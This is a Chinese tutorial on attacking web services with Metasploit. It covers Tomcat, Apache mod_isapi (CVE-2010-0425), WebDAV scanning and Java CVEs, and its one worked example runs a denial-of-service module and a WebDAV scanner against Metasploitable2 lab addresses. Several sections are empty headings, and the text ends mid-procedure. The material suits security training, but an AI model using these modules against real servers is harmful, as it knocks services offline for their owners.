网站是指在互联网上，根据一定的规则，使用HTML等工具制作的用于展示特定内容的相关网页的集合。简单地说，网站是一种通信工具，就像布告栏一样，人们可以通过网站发布自己想要公开的信息，或者利用网站提供相关的网络服务。人们可以通过网页浏览器访问网站，获取自己需要的资讯或者享受网络服务。通常，在一个网站上会搭建有Web服务器、MySQL服务、FTP服务等。如果这些服务中存在漏洞，攻击者即可利用这些漏洞。另外，网站是由多个网页构成，但是网页又是通过一些源代码编写出来的，如果编写网页，则需要有对应的开发环境，如Java等，而在开发环境中也可能会存在各种漏洞，因此攻击者也可以进行漏洞利用。本文介绍对网站实施渗透攻击的实例。


1、渗透攻击Tomcat服务


Tomcat服务器是一个免费的开放源代码的Web应用服务器。它可以运行在Linux和Windows等多个平台上。由于其性能稳定、扩展性好、免费等特点，深受广大用户的喜爱。目前，互联网上绝大多数Java Web等应用都运行在Tomcat服务器上。Tomcat默认存在一个管理后台，默认的管理地址是http://IP或域名：端口/manager/html。通过此后台，可以在不重启Tomcat服务的情况下方便地部署、启动、停止或卸载Web应用。但是如果配置不当的话则会存在很大的安全隐患。攻击者利用这个漏洞，可以非常快速、轻松地入侵一台服务器。下面介绍渗透攻击Tomcat服务的方法。

2、CVE-2010-0425漏洞


Apache HTTP Server（2.2.14之前的版本，并且是2.2.X系列）的核心mod_isap模块modules/arch/win32/mod_isapi.c中存在安全漏洞。如果远程用户在向Apache服务器的mod_isapi模块发送了特制的请求之后又发送了重置报文，就可能导致从内存中卸载目标ISAPI模块。但函数仍在内存中，在引用发布的ISAP函数时仍可调用，这就造成了悬挂指针（野指针）问题。成功利用该漏洞的攻击者，可以以SYSTEM权限执行任意代码。下面介绍利用CVE-2010-0425漏洞的方法。


利用CVE-2010-0425漏洞卸载目标主机（Metasploitable2）的ISAPI模块。具体操作步骤如下：


1）搜索CVE-2010-0425漏洞的完整路径。执行命令如下：


msf5 > search CVE-2010-0425

Matching Modules

================

Name  Disclosure Date   Rank  Check  Description

-------------        ----------------         ------     ------------------

auxiliary/dos/http/apache_mod_isapi  2010-03-05   normal   No   Apache mod_isapi Dangling Pointer


从输出信息中可以看到，CVE-2010-0425漏洞的完整路径为auxiliary/dos/http/apache_mod_isapi。


2）使用dos/http/apache_mod_isapi模块，并查看该模块的配置选项参数，执行命令如下：


msf5 > use auxiliary/dos/http/apache_mod_isapi

msf5 auxiliary(apache_mod_isapi) > show options

从以上输出的信息中可以看到，需要配置目标地址选项。


3）配置选项参数如下：

RHOST => 192.168.1.102


4）实施渗透攻击。执行命令如下：


msf5 auxiliary(apache_mod_isapi) > exploit

3、探测网站是否启用WebDAV


WebDAV（Web-based Distributed Authoring and Versioning）是一种基于HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可直接对Web服务器进行读/写，并设置写文件锁定及解锁，还可以支持文件的版本控制。下面介绍利用scanner/http/webdav_scanner模块探测Web服务器是否启用WebDAV功能。


使用scanner/http/webdav_scanner模块探测目标（192.168.1.0/24）中的Web服务器是否启用WebDAV功能。具体操作步骤如下：


1）使用scanner/http/webdav_scanner模块，并查看该模块的选项参数。执行命令如下：


msf5 > use auxiliary/scanner/http/webdav_scanner

msf5 auxiliary(webdav_scanner) > show options

4、Oracle Java SE远程拒绝服务漏洞（CVE-2012-0507）

5、Java零日漏洞（CVE-2012-4681）


在Java中，还有一个Java 0day漏洞。该漏洞仅对浏览器的JRE[1.7.X]插件影响非常大，不影响Java 6。攻击者可利用该漏洞进行挂马攻击。在Metasploit中提供了用于利用Java零日漏洞的攻击模块java_jre17_exec，下面利用该漏洞实施渗透攻击。


利用Java零日漏洞实施渗透攻击。具体操作步骤如下：
